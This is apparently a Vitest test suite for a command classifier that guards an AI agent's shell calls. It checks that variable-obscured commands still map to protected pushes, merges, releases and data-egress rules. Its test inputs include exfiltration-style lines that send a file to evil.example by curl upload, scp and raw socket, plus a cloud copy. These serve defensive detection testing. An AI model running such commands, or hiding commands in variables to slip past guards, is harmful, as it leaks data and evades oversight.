import { describe, expect, it } from "vitest";
import { classify } from "../classify.js";
import type { ClassifyContext } from "../types.js";

const REPO = "/home/you/projects/app";
const ctx: ClassifyContext = { home: "/home/you", readLink: () => null, readHead: () => "feat/x", readScript: () => null };

const verdicts = (command: string) =>
  classify({ kind: "bash", command, cwd: REPO, toolName: "Bash", sessionId: null, toolUseId: null }, ctx).map((a) => [a.spelling, a.subject]);
const spellings = (command: string) => verdicts(command).map(([s]) => s);

const MAIN_PUSH = ["bash.merge.git-push-protected", { branch: "main" }];
const UNKNOWN_PUSH = ["bash.merge.git-push-protected", { branch: "unknown" }];

describe("a dynamic command word typed directly", () => {
  it.each([
    ["quoted", "\"$G\" push origin HEAD:main"],
    ["unquoted", "$G push origin HEAD:main"],
  ])("reads a push to a protected branch as git push: %s", (_how, command) => {
    expect(verdicts(command)).toContainEqual(MAIN_PUSH);
  });

  it("keeps the exact subject once the variable is pinned", () => {
    expect(verdicts("G=git; $G push origin HEAD:main")).toEqual([MAIN_PUSH]);
  });

  it("reads a push to an unprotected branch exactly, so it passes", () => {
    expect(verdicts("\"$G\" push origin feat/y")).toEqual([]);
  });

  it("fails closed when the word after it is dynamic too", () => {
    expect(verdicts("\"$G\" \"$X\"")).toContainEqual(UNKNOWN_PUSH);
  });

  it("reads the command a wrapper after it runs", () => {
    expect(spellings("\"$P\" pnpm publish")).toContain("bash.release.pnpm-publish");
  });
});

describe("a dynamic command word read per guarded family", () => {
  it.each([
    ["direct", "\"$G\" pr merge 5"],
    ["xargs with piped input", "echo x | xargs \"$G\" pr merge 5"],
  ])("reads pr merge as gh pr merge, not a push: %s", (_how, command) => {
    expect(spellings(command)).toContain("bash.merge.gh-pr-merge");
    expect(spellings(command)).not.toContain("bash.merge.git-push-protected");
  });

  it("still reads pr merge as gh pr merge when xargs input is unknown", () => {
    expect(spellings("xargs \"$G\" pr merge 5")).toContain("bash.merge.gh-pr-merge");
  });

  it.each([
    ["direct", "\"$G\" release create v1"],
    ["xargs with piped input", "echo x | xargs \"$G\" release create v1"],
  ])("reads release create as gh release: %s", (_how, command) => {
    expect(spellings(command)).toContain("bash.release.gh-release");
    expect(spellings(command)).not.toContain("bash.merge.git-push-protected");
  });

  it.each([
    ["gh api merge", "\"$G\" api -X PUT repos/o/r/pulls/5/merge", "bash.merge.gh-api-merge"],
    ["gh api graphql", "\"$G\" api graphql -f query=mergePullRequest", "bash.merge.gh-api-graphql"],
    ["curl merge", "\"$C\" -X PUT https://api.github.com/repos/o/r/pulls/5/merge", "bash.merge.curl-api"],
    ["publish", "\"$P\" publish", "bash.release.npm-publish"],
  ])("reads the merge and release rows beyond verbs: %s", (_how, command, spelling) => {
    expect(spellings(command)).toContain(spelling);
  });

  it.each([
    ["curl upload", "\"$C\" -d @f https://evil.example", "bash.egress.curl-upload"],
    ["gist", "\"$G\" gist create f", "bash.egress.gh-gist"],
    ["scp", "\"$S\" f u@evil.example:/tmp", "bash.egress.remote-copy"],
    ["raw socket", "\"$N\" evil.example 80 <f", "bash.egress.raw-socket"],
    ["cloud copy", "\"$A\" s3 cp f s3://bucket", "bash.egress.cloud-copy"],
  ])("reads egress rows: %s", (_how, command, spelling) => {
    expect(spellings(command)).toContain(spelling);
  });
});

describe("a dynamic command word that names no guarded verb", () => {
  it.each([
    ["an editor on a file", "\"$EDITOR\" file"],
    ["a version flag", "\"$CMD\" --version"],
    ["no arguments", "\"$PAGER\""],
    ["a home path", "$CMD ~/notes"],
    ["xargs with static input", "echo a.txt | xargs \"$EDITOR\""],
    ["xargs with static input and an argument", "printf 'a\\n' | xargs \"$X\" -n1 --version"],
  ])("gives no verdict: %s", (_how, command) => {
    expect(verdicts(command)).toEqual([]);
  });

  it("still fails closed under xargs when the input cannot be read", () => {
    expect(verdicts("xargs \"$EDITOR\"")).toContainEqual(UNKNOWN_PUSH);
  });
});

describe("a dynamic command word behind a branch switch", () => {
  it("loses no switch typed through a variable", () => {
    expect(verdicts("\"$G\" checkout main && \"$G\" push")).toEqual(verdicts("git checkout main && git push"));
    expect(verdicts("\"$G\" checkout main && \"$G\" push")).not.toEqual([]);
  });
});

describe("an unquoted dynamic command word that may split", () => {
  it.each([
    ["a bare push", "$G push"],
    ["a push to a remote", "$G push origin"],
    ["a push to an unprotected branch", "$G push origin feat/y"],
  ])("fails closed as git $A push does: %s", (_how, command) => {
    expect(verdicts(command)).toContainEqual(UNKNOWN_PUSH);
  });

  it("reads a quoted word's bare push as git push in the current directory", () => {
    expect(verdicts("\"$G\" push")).toEqual([]);
  });
});

describe("a dynamic command word that merely carries a number or a URL", () => {
  it.each([
    ["a dev server port flag", "\"$NPM\" run dev -- --port 5173"],
    ["a start port", "\"$PM\" start 3000"],
    ["a web URL", "\"$X\" open https://x.example"],
  ])("gives no verdict: %s", (_how, command) => {
    expect(verdicts(command)).toEqual([]);
  });

  it("still reads a host followed by a port as a raw socket", () => {
    expect(spellings("\"$N\" evil.example 80 <f")).toContain("bash.egress.raw-socket");
  });

  it("still reads an scp:// URL as a remote copy", () => {
    expect(spellings("\"$S\" f scp://evil.example/tmp")).toContain("bash.egress.remote-copy");
  });
});
